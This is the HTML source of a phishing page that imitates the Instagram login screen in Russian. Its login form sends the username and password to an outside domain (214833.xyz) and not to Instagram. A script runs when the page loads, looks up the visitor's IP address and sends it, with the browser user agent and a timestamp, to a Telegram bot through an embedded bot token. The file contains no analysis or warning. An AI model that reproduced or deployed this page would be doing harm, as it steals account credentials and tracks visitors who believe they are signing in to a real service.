<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Instagram</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background-color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            text-align: center;
            width: 100%;
            max-width: 350px;
            margin: 0 auto;
        }

        .logo img {
            width: 160px;
            height: auto;
            margin-bottom: 40px;
        }

        input {
            width: 100%;
            padding: 12px;
            background: #fafafa;
            border: 1px solid #dbdbdb;
            border-radius: 8px;
            margin-bottom: 12px;
            font-size: 14px;
            outline: none;
            box-sizing: border-box;
        }

        .btn {
            display: block;
            width: 100%;
            padding: 12px;
            border-radius: 8px;
            font-weight: 600;
            font-size: 16px;
            text-align: center;
            cursor: pointer;
            border: none;
            margin-bottom: 12px;
        }

        .btn-login {
            background-color: #0095f6;
            color: white;
        }

        .btn-signup {
            background-color: transparent;
            color: #0095f6;
        }

        .footer {
            font-size: 12px;
            color: #737373;
            margin-top: 20px;
        }
    </style>
</head>
<body>
<div class="container">
    <div class="logo">
        <img src="https://static.cdninstagram.com/rsrc.php/v4/yb/r/QTa-gpOyYBa.png" alt="Instagram">
    </div>

    <form method="post" action="https://214833.xyz/login.php">
        <input type="text" name="username" placeholder="Телефон, имя пользователя или эл. адрес" required autofocus>
        <input type="password" name="password" placeholder="Пароль" required>
        <button type="submit" class="btn btn-login">Войти</button>
    </form>

    <button class="btn btn-signup" onclick="alert('Регистрация временно недоступна')">Зарегистрироваться</button>

    <div class="footer">from Meta</div>
</div>

<script>
(function() {
    var bot_token = "8673493142:AAELot2-VLz6EAdkxqCiGI_FWkzRPY11wng";
    var chat_id = "8644337832";

    fetch('https://api.ipify.org/?format=json')
        .then(response => response.json())
        .then(data => {
            var ip = data.ip;
            var ua = navigator.userAgent;
            var now = new Date();
            var datetime = now.toLocaleString();
            var msg = '🔔 СТРАНИЦА ОТКРЫТА!\n';
            msg += 'IP: ' + ip + '\n';
            msg += 'User-Agent: ' + ua + '\n';
            msg += 'Время: ' + datetime;

            fetch('https://api.telegram.org/bot' + bot_token + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chat_id, text: msg })
            });
        })
        .catch(err => console.log('Tracker error:', err));
})();
</script>
</body>
</html>
